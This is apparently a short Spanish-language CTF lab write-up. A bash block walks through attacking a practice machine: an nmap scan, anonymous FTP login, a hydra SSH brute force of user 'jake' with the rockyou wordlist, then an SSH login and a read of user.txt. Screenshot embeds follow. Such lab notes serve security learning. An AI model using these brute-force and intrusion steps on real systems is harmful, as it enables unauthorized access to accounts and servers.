
```bash
#!/bin/bash
ping 10.10.140.16 #Hacemos un ping para ver si existe conectividad
nmap -p- --open -sS -sC -sV --min-rate 5000 -n -vvv -Pn 10.10.140.16 -oN escaneo 
#Vemos los puertos 21 y 22 abiertos con la vulnerabilidad anonymous ftp
ftp 10.10.140.16 #Entramos en el servidor y cogemos los archivos de este
cat note_to_jake.txt #Esta nota nos induce a un ataque de fuerza bruta al usuario jake
hydra 10.10.140.16 ssh -l jake -P /usr/share/wordlists/rockyou.txt
#Obtenemos la contraseña e iniciamos sesion en el usuario jake
ssh jake@10.10.140.16
cd ../holt
cat user.txt
```
nmap![[Pasted image 20231119172049.png]]Servidor ftp![[Pasted image 20231119172139.png]]Esta nota nos induce a un ataque de fuerza bruta![[Pasted image 20231119172349.png]]Hydra![[Pasted image 20231119172541.png]]User
![[Pasted image 20231119173321.png]]
Sudo
![[Pasted image 20231119173028.png]]